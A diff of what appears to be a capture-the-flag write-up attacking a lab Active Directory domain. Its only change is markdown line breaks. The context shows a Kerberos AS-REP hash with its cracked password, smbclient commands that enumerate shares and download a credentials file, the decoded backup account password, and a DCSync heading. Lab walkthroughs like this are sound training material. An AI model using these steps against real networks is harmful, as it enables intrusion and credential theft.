@@ -58,7 +58,8 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:9e9d37205ca2b017be8b60ae4decc7d8$4d81d58
 ```  svc-admin:management2005```
 
 # smbclient -L //10.10.83.246 -U 'svc-admin' 
-```	Sharename       Type      Comment
+```	
+        Sharename       Type      Comment
 	---------       ----      -------
 	ADMIN$          Disk      Remote Admin
 	backup          Disk      
@@ -70,7 +71,8 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:9e9d37205ca2b017be8b60ae4decc7d8$4d81d58
 # smbclient //10.10.83.246/backup -U 'svc-admin'
 
 # smb: \> get backup_credentials.txt
-```YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+```
+YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
 backup@spookysec.local:backup2517860
 ```
 #  DCSync
